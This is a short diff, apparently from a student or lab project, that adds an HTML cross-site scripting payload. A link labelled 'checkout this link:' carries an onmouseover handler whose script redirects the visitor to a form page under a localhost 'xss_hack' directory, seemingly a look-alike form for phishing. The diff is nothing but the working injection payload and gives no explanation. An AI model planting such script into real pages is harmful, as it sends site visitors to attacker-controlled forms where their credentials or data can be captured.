@@ -1,0 +1,3 @@
+<a onmouseover="hello()">checkout this link:</a><script>function hello(){
+window.location = "http://localhost/minorv2/xss/xss_hack/form.html"
+}</script>
